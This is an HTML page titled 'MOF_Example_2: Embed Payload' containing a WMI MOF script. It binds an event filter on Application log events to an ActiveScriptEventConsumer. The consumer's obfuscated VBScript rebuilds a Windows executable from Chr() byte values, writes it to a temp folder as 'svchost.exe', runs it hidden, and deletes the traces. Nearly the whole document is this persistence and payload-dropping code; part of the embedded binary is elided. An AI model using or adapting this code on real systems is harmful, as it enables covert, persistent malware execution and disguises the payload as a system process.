<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>MOF_Example_2: Embed Payload</title>
</head><body>#pragma namespace (&quot;\\\\.\\root\\subscription&quot;)<br/>
<br/>
instance of __EventFilter as $FILTER<br/>
{<br/>
  Name = &quot;XPLOIT_TEST_SYSTEM&quot;;<br/>
  EventNamespace = &quot;root\\cimv2&quot;;<br/>
  Query = &quot;SELECT * FROM __InstanceCreationEvent &quot;<br/>
 &quot;WHERE TargetInstance ISA \&quot;Win32_NTLogEvent\&quot; AND &quot;<br/>
 &quot;TargetInstance.LogFile=\&quot;Application\&quot;&quot;;<br/>
<br/>
  QueryLanguage = &quot;WQL&quot;;<br/>
};<br/>
<br/>
instance of ActiveScriptEventConsumer as $CONSUMER<br/>
{<br/>
  Name = &quot;XPLOIT_TEST_SYSTEM&quot;;<br/>
  ScriptingEngine = &quot;VBScript&quot;;<br/>
<br/>
  ScriptText = &quot;Function jcmNPtWMUEOI() \n&quot;<br/>
&quot;vURTl=Chr(77)&amp;Chr(90)&amp;Chr(144)&amp;Chr(0)&amp;Chr(3)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(4)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(255)&amp;Chr(255)&amp;Chr(0)&amp;Chr(0)&amp;Chr(184)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(232)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(14)&amp;Chr(31)&amp;Chr(186)&amp;Chr(14)&amp;Chr(0)&amp;Chr(180)&amp;Chr(9)&amp;Chr(205)&amp;Chr(33)&amp;Chr(184)&amp;Chr(1)&amp;Chr(76)&amp;Chr(205)&amp;Chr(33)&amp;Chr(84)&amp;Chr(104)&amp;Chr(105)&amp;Chr(115)&amp;Chr(32)&amp;Chr(112)&amp;Chr(114)&amp;Chr(111)&amp;Chr(103)&amp;Chr(114)&amp;Chr(97)&amp;Chr(109)&amp;Chr(32)&amp;Chr(99)&amp;Chr(97)&amp;Chr(110)&amp;Chr(110)&amp;Chr(111)&amp;Chr(116)&amp;Chr(32)&amp;Chr(98)&amp;Chr(101) \n&quot;<br/>
// [...]<br/>
&quot;vURTl=vURTl&amp;Chr(0)&amp;Chr(16)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(32)&amp;Chr(0)&amp;Chr(0)&amp;Chr(96)&amp;Chr(46)&amp;Chr(114)&amp;Chr(100)&amp;Chr(97)&amp;Chr(116)&amp;Chr(97)&amp;Chr(0)&amp;Chr(0)&amp;Chr(230)&amp;Chr(15)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(16)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(46)&amp;Chr(100)&amp;Chr(97)&amp;Chr(116)&amp;Chr(97)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(92)&amp;Chr(112)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(208)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(208)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192) \n&quot; <br/>
&quot;Dim eXmdsyLFEs \n&quot;<br/>
&quot;Set eXmdsyLFEs = CreateObject(\&quot;Scripting.FileSystemObject\&quot;) \n&quot;<br/>
&quot;Dim TxNAbBlYJ \n&quot;<br/>
&quot;Dim OnzEldZtxrMeY \n&quot;<br/>
&quot;Dim YzlWLAgbdcsRP \n&quot;<br/>
&quot;Dim gpvFZLaXwIZzKCJ \n&quot;<br/>
&quot;Set OnzEldZtxrMeY = eXmdsyLFEs.GetSpecialFolder(2) \n&quot;<br/>
&quot;gpvFZLaXwIZzKCJ = OnzEldZtxrMeY &amp; \&quot;\\\&quot; &amp; eXmdsyLFEs.GetTempName() \n&quot;<br/>
&quot;eXmdsyLFEs.CreateFolder(gpvFZLaXwIZzKCJ) \n&quot;<br/>
&quot;YzlWLAgbdcsRP = gpvFZLaXwIZzKCJ &amp; \&quot;\\\&quot; &amp; \&quot;svchost.exe\&quot; \n&quot;<br/>
&quot;Set TxNAbBlYJ = eXmdsyLFEs.CreateTextFile(YzlWLAgbdcsRP,2,0) \n&quot;<br/>
&quot;TxNAbBlYJ.Write vURTl \n&quot;<br/>
&quot;TxNAbBlYJ.Close \n&quot;<br/>
&quot;Dim VvLFolkbOsQvlf \n&quot;<br/>
&quot;Set VvLFolkbOsQvlf = CreateObject(\&quot;Wscript.Shell\&quot;) \n&quot;<br/>
&quot;VvLFolkbOsQvlf.run YzlWLAgbdcsRP, 0, true \n&quot;<br/>
&quot;eXmdsyLFEs.DeleteFile(YzlWLAgbdcsRP) \n&quot;<br/>
&quot;eXmdsyLFEs.DeleteFolder(gpvFZLaXwIZzKCJ) \n&quot;<br/>
&quot;End Function \n&quot;<br/>
&quot;jcmNPtWMUEOI \n&quot;;    <br/>
};<br/>
<br/>
instance of __FilterToConsumerBinding<br/>
{<br/>
  Consumer = $CONSUMER ;<br/>
  Filter = $FILTER ;<br/>
};</body></html>